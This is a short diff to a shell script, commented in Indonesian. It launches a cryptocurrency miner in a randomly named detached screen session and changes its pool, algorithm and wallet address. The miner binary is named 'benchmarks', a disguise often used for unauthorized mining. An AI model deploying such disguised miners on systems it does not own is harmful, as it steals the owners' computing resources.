@@ -26,7 +26,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3-${RAND}'..."
   screen -dmS amirul3-${RAND} bash -c '
     while true; do
-      ./benchmarks --algorithm randomscash --pool stratum-asia.rplant.xyz:7019 -u scash1qadxmcz7w0sn6ketn9nts344xdrs2tca6n55jj0 --cpu-threads 20
+      ./benchmarks --algorithm power2b --pool stratum+tcps://stratum-asia.rplant.xyz:17022 -u MXgkJi63btXqTDWULWi45Km3E7FiNaK9fR.${RAND} --cpu-threads 20
       sleep 2
     done
   '
